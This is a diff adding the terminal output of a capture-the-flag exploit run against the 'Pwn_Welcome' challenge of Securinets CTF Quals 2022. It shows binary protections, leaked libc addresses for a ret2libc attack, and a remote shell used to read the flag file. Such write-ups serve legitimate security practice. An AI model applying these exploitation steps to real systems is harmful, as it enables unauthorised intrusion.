@@ -1,0 +1,28 @@
+mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Welcome$ python solve.py  r
+[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Welcome/welc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 20.216.39.14 on port 1237: Done
+[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Welcome/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr   = 0x7ffbf50c9450
+libc_base   = 0x7ffbf5045000
+system_addr = 0x7ffbf50972c0
+binsh_addr  = 0x7ffbf51f95bd
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls -l
+total 44
+-rw-rw-r-- 1 root root    61 Apr  9 16:28 flag.txt
+-rwxrwxr-x 1 root root 16896 Apr  9 16:26 welc
+-rwxrwxr-x 1 root root 18744 Apr  9 03:24 ynetd
+$ cat flag.txt
+Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}
